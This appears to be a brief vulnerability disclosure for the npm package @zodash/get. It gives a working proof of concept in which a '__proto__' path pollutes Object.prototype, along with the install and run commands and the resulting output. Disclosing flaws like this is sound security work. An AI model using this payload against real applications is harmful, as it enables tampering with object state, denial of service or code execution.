# Description

`@zodash/get` vulnerable to `Prototype Pollution`.

# Proof of Concept

1. Create the following PoC file:
```javascript
// poc.js
const { get } = require('@zodash/get')

console.log(`Before: ${{}.polluted}`)
get({}, '__proto__').polluted = true
console.log(`After: ${{}.polluted}`)
```
2. Execute the following commands in the terminal:
```bash
npm i @zodash/get # install vulnerable package
node poc.js # run the PoC
```
3. Check the output:
```
Before: undefined
After: true
```

# Impact

`Prototype Pollution` leads to Information Disclosure/DoS/RCE.

